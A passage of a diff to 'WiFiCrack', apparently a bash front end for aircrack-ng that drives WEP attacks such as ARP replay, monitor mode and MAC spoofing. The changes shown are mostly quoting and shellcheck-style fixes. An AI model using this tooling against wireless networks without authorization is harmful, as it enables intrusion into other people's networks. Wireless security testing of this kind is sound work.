-    go_back
-fi
+            ;;
+        [Nn] )
+            kill "$(pgrep aireplay-ng)"
+            kill "$(pgrep xterm)"
+            clean_up
+            unset ESSID
+            unset AIRODUMP
+            unset CHAN
+            unset BSSID
+            unset ANS
+            unset CAP
+            unset CHOICE
+            unset INJ
+            unset ANSWER
+            read -rp "Press Enter to exit and go back. " KEY
+            go_back
+            ;;
+        * )
+            echo -ne "\nInvalid answer, enter y or n "
+            ;;
+    esac
+done
 }
 function wep_attacks {
 clear
+unset CHANFLAG
 echo "-------------- Select Attack Method --------------"
 echo
 echo "You picked ($AP)"
@@ -968,9 +978,9 @@ echo "s) Select different AP"
 echo "c) Cancel"
 echo
 echo -n "$PROMPT"
-while read -n1 SEL
+while read -rn1 SEL
 do
-    case $SEL in
+    case "$SEL" in
         1 )
             arp_replay
             break
@@ -991,13 +1001,14 @@ do
             ;;
         * )
             echo -ne "\n$PROMPT"
+            ;;
     esac
 done
 }
 function show_info {
 clear
 ADDR=$(iw "$IFACE" info | grep addr | awk -F ' ' '{print $2}')
-TYPE=$(iw "$IFACE" info | grep \t\y\p\e | awk -F ' ' '{print $2}')
+TYPE=$(iw "$IFACE" info | grep "type" | awk -F ' ' '{print $2}')
 TXPOWER=$(iw "$IFACE" info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
 NAME=$(iw "$IFACE" info | grep Interface | awk -F ' ' '{print $2}')
 CHANNEL=$(iw "$IFACE" info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
@@ -1024,7 +1035,7 @@ else
     echo "Disabling Monitor Mode for $IFACE..."
     echo
     echo "Bringing $IFACE down..."
-    IFACE=$(ls /sys/class/net | grep "$IFACE")
+    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
     ifconfig "$IFACE" down >> /dev/null
     echo "Reverting MAC address to factory default..."
     macchanger -p "$IFACE"  >> /dev/null
@@ -1046,16 +1057,24 @@ if [[ -z "$STATE" ]]; then
     echo
     echo "Creating new interface..."
     if [[ "$CHANFLAG" = 1 ]]; then
+        clear
+        echo "Setting $IFACE in Monitor Mode..."
+        echo
+        echo "Creating new interface..."
+        echo
+        echo "You picked ($AP)"
+        echo "The new interface will be set on channel : $CHAN."
+        echo
         airmon-ng start "$IFACE" "$REPLY" >> /dev/null
     else
-        read -p "Set Channel or (Press Enter to skip) : " REPLY
+        read -rp "Set Channel or (Press Enter to skip) : " REPLY
         if [[ "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) ]]; then 
             airmon-ng start "$IFACE" "$REPLY" >> /dev/null
         elif [[ ! "$LIST" =~ (^|[[:space:]])"$REPLY"($|[[:space:]]) && "$REPLY" = "" ]]; then 
             airmon-ng start "$IFACE" >> /dev/null
         else
             echo "Invalid Channel \"$REPLY\" entered. "
-            read -p "Retry ? [yn] " ASK
+            read -rp "Retry ? [yn] " ASK
             if [[ "$ASK" = [Yy] && "$REPLY" != "" ]]; then
                 unset REPLY
                 unset ASK
@@ -1072,7 +1091,7 @@ if [[ -z "$STATE" ]]; then
             fi
         fi
     fi
-    IFACE=$(ls /sys/class/net | grep "$IFACE")
+    IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | grep "$IFACE")
     echo "Bringing $IFACE down..."
     ifconfig "$IFACE" down >> /dev/null
     echo "Changing MAC address for $IFACE"
@@ -1080,7 +1099,7 @@ if [[ -z "$STATE" ]]; then
     echo "Bringing $IFACE up..."
     ifconfig "$IFACE" up >> /dev/null
     NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
-    STATE=$(iw $IFACE info | grep monitor)
+    STATE=$(iw "$IFACE" info | grep monitor)
     echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
     unset REPLY
     unset LIST
@@ -1114,9 +1133,9 @@ echo
 SELECT="Press r to rescan or Enter to go back : "
 echo
 echo -n "$SELECT"
-while read -n1 SLCT
+while read -rn1 SLCT
 do
-    case $SLCT in
+    case "$SLCT" in
         [Rr] )
             show_APs
             break
@@ -1138,7 +1157,7 @@ if [[ -n $STATE ]]; then
 else
     MM=OFF
 fi
-MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
+MAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
 echo "----------------------- WiFiCrack v0.7_beta -----------------------"
 echo "WLAN Interface : $IFACE                MAC : $MAC"
 if [[ "$MM" = "ON" ]]; then
@@ -1173,15 +1192,16 @@ select CHOICE in "${IFACES[@]}"; do
     [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
     break
 done
-IFACE=$(echo $CHOICE | awk -F ' ' '{print $2}')
+IFACE=$(echo "$CHOICE" | awk -F ' ' '{print $2}')
 }
 function single_interface {
-IFACE=$(ls /sys/class/net | grep wl)
-STATE=$(iw $IFACE info | grep monitor)
+#IFACE=$(ls /sys/class/net | grep wl)
+IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}')
+STATE=$(iw "$IFACE" info | grep monitor)
 menu
-while read -n1 CHAR
+while read -rn1 CHAR
 do
-    case $CHAR in
+    case "$CHAR" in
         1 )
             choose_mode
             break
@@ -1206,27 +1226,27 @@ do
         h )
             echo
             help
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             single_interface
             break
             ;;
         v )
             show_APs
             echo
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             single_interface
             break
             ;;
         s )
             show_info
             echo
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             single_interface
             break
             ;;
         t )
             test_injection
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             single_interface
             break
             ;;
@@ -1247,7 +1267,7 @@ do
                 unset_mon >> /dev/null
             fi
             unset FLG
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             single_interface
             break
             ;;
@@ -1257,15 +1277,16 @@ do
             ;;
         * )
             echo -ne "\n$PROMPT"
+            ;;
     esac
 done
 }
 function multiple_interfaces {
-STATE=$(iw $IFACE info | grep monitor)
+STATE=$(iw "$IFACE" info | grep monitor)
 menu
-while read -n1 CHAR
+while read -rn1 CHAR
 do
-    case $CHAR in
+    case "$CHAR" in
         1 )
             choose_mode
             break
@@ -1290,27 +1311,27 @@ do
         h )
             echo
             help
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             multiple_interfaces
             break
             ;;
         v )
             show_APs
             echo
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             multiple_interfaces
             break
             ;;
         s )
             show_info
             echo
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             multiple_interfaces
             break
             ;;
         t )
             test_injection
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             multiple_interfaces
             break
             ;;
@@ -1331,7 +1352,7 @@ do
                 unset_mon >> /dev/null
             fi
             unset FLG
-            read -p "Press Enter to go back" KEY
+            read -rp "Press Enter to go back" KEY
             multiple_interfaces
             break
             ;;
@@ -1346,6 +1367,7 @@ do
             ;;
         * )
             echo -ne "\n$PROMPT"
+            ;;
     esac
 done
 }
@@ -1356,7 +1378,7 @@ if [[ "$EUID" -ne 0 ]]; then
 fi
 }
 function check_wlan {
-IFACENUM=$(ls /sys/class/net/ | grep -c wl)
+IFACENUM=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | wc -l)
 if [[ "$IFACENUM" -gt 1 ]]; then
     echo "You have multiple WLAN interfaces."
     list_ifaces
